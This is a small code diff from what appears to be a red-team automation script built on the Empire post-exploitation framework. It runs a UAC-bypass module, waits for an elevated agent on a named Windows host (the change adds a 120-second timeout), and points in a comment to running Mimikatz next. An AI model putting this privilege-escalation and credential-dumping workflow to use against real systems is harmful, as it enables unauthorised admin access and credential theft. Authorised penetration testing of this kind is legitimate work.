@@ -21,8 +21,8 @@ try other stuff use a common API context instead of creating a new one per techn
 
     empire_bypassUAC.run(API, agent['name'], privesc.bypassuac.path)
 
-    # wait for non-privilege agent
-    agent = empire_wait_for_agent.run(API,'WIN-7JKBJEGBO38', True)
+    # wait for non-privilege agent for 120 seconds
+    agent = empire_wait_for_agent.run(API,'WIN-7JKBJEGBO38', True, 120)
     if agent is not None:
         print('yeay!!! we got an {0} admin user'.format(admin_type))    
         # you can run Mimikatz or any privilege activities...
